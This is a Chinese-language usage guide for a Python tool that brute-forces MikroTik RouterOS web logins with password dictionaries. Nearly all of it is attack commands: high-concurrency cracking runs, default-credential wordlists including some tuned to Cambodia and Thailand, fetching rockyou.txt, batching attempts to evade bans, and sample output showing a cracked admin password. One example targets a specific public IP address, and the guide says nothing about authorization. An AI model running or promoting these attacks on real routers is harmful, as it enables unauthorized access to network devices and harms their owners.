# 🔥 RouterOS 字典爆破工具使用指南

## 📦 工具：routeros_dict_brute.py

**最强大的字典爆破工具！支持超大密码字典！**

---

## 🚀 快速开始

### 1. 基本用法
```bash
python3 routeros_dict_brute.py http://target -U admin -p passwords.txt
```

### 2. 并发模式（推荐！速度快50倍）
```bash
python3 routeros_dict_brute.py http://target -U admin -p passwords.txt --parallel -w 50
```

### 3. 多用户名 + 大字典
```bash
python3 routeros_dict_brute.py http://target -u users.txt -p passwords.txt --parallel -w 100
```

---

## 📝 准备字典文件

### 创建用户名字典（users.txt）
```bash
cat > users.txt << EOF
admin
administrator
root
user
mikrotik
support
guest
EOF
```

### 创建密码字典（passwords.txt）
```bash
cat > passwords.txt << EOF
admin
password
mikrotik
router
secret
P@ssw0rd
admin123
root123
mikrotik123
cambodia
thailand
khmer
bangkok
phnompenh
1234
12345
123456
EOF
```

### 下载超大字典（rockyou.txt - 1400万密码）
```bash
# 方法1: GitHub
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 方法2: 从Kali Linux
locate rockyou.txt
# 通常在 /usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 🎯 实战案例

### 案例1: 单用户名 + 小字典（快速测试）
```bash
python3 routeros_dict_brute.py http://203.189.136.83 \
    -U admin \
    -p test_passwords.txt
```

### 案例2: 单用户名 + 中等字典 + 并发
```bash
python3 routeros_dict_brute.py http://target \
    -U admin \
    -p passwords.txt \
    --parallel -w 50
```

### 案例3: 多用户 + 大字典 + 高并发
```bash
python3 routeros_dict_brute.py http://target \
    -u users.txt \
    -p rockyou.txt \
    --parallel -w 100
```

### 案例4: 命令行指定密码列表
```bash
python3 routeros_dict_brute.py http://target \
    -U admin \
    -P "password,admin,mikrotik,router,secret,P@ssw0rd"
```

### 案例5: 针对柬埔寨/泰国优化
```bash
# 创建地区定制字典
cat > asia_passwords.txt << EOF
cambodia
cambodia123
khmer
khmer123
thailand
thailand123
bangkok
bangkok123
phnompenh
admin
password
mikrotik
EOF

python3 routeros_dict_brute.py http://target \
    -U admin \
    -p asia_passwords.txt \
    --parallel -w 30
```

---

## ⚡ 性能对比

| 字典大小 | 串行模式 | 并发20线程 | 并发50线程 | 并发100线程 |
|---------|---------|-----------|-----------|------------|
| 100个密码 | ~100秒 | ~5秒 | ~2秒 | ~1秒 |
| 1000个密码 | ~17分钟 | ~50秒 | ~20秒 | ~10秒 |
| 10000个密码 | ~3小时 | ~8分钟 | ~3分钟 | ~2分钟 |
| 100000个密码 | ~28小时 | ~1.4小时 | ~33分钟 | ~17分钟 |
| rockyou.txt (1400万) | ~162天 | ~8天 | ~3天 | ~1.6天 |

**结论：并发100线程 + rockyou.txt = 最强组合！**

---

## 🔧 命令参数详解

```bash
python3 routeros_dict_brute.py [目标] [选项]

必选参数:
  目标URL                    http://192.168.1.1

用户名选项（二选一）:
  -u, --users FILE          用户名字典文件
  -U, --username USER       单个用户名

密码选项（二选一）:
  -p, --passwords FILE      密码字典文件
  -P, --password-list LIST  密码列表（逗号分隔）

性能选项:
  --parallel                启用并发模式
  -w, --workers NUM         并发线程数（默认20）
  -t, --timeout SEC         超时时间（默认10秒）

其他选项:
  -o, --output FILE         保存结果到JSON文件
  -h, --help                显示帮助
```

---

## 💡 高级技巧

### 1. 生成自定义字典
```bash
# 使用crunch生成数字字典
crunch 4 8 0123456789 > numbers.txt

# 使用crunch生成字母数字组合
crunch 6 10 -t @@@@%% > custom.txt

# 组合多个字典
cat dict1.txt dict2.txt dict3.txt > combined.txt
```

### 2. 优化字典顺序
```bash
# 最常见的密码放在前面
cat > optimized.txt << EOF
admin
password
123456
mikrotik
router
EOF
cat rockyou.txt >> optimized.txt
```

### 3. 去重和排序
```bash
# 去重
sort -u passwords.txt > unique_passwords.txt

# 按长度排序（短的先试）
awk {print length, --} passwords.txt | sort -n | cut -d  -f2- > sorted.txt
```

### 4. 分批次爆破（避免被Ban）
```bash
# 先试最常见的100个
head -100 rockyou.txt > top100.txt
python3 routeros_dict_brute.py http://target -U admin -p top100.txt --parallel -w 10

# 如果失败，再试1000个
head -1000 rockyou.txt > top1000.txt
python3 routeros_dict_brute.py http://target -U admin -p top1000.txt --parallel -w 20
```

---

## 🛡️ 防止误报

字典工具使用相同的验证逻辑：
1. ✅ HTTP状态码检查
2. ✅ 响应内容检查（必须包含logout/dashboard等）
3. ✅ 排除登录页面（包含login+password）

**不会误报！**

---

## 📊 成功案例

### 示例输出
```
[+] 目标: http://192.168.1.1
[+] 用户名: 1 个
[+] 密码: 17 个
[+] 总尝试: 17 次
[+] 模式: 串行

[1/17] admin:admin ✗
[2/17] admin:password ✗
[3/17] admin:mikrotik ✓ 成功!

============================================================
成功! 找到凭据:
  用户: admin
  密码: mikrotik
============================================================
```

---

## 🎓 推荐使用流程

### 第1步：快速测试（默认凭据）
```bash
python3 routeros_ultimate_brute_fixed.py http://target
```

### 第2步：小字典爆破（常用密码）
```bash
python3 routeros_dict_brute.py http://target \
    -U admin \
    -p test_passwords.txt \
    --parallel -w 30
```

### 第3步：大字典爆破（rockyou.txt）
```bash
python3 routeros_dict_brute.py http://target \
    -U admin \
    -p rockyou.txt \
    --parallel -w 100
```

---

## 📝 总结

**字典爆破工具 = 最强大的RouterOS爆破方案！**

**推荐配置:**
- **快速测试:** `-w 20` (平衡)
- **中等字典:** `-w 50` (快速)
- **超大字典:** `-w 100` (最快)

**立即使用:**
```bash
cd /root/mikrotik_ecsrp5_toolkit
python3 routeros_dict_brute.py http://target -U admin -p passwords.txt --parallel -w 50
```

🚀 **支持1400万密码的rockyou.txt！**
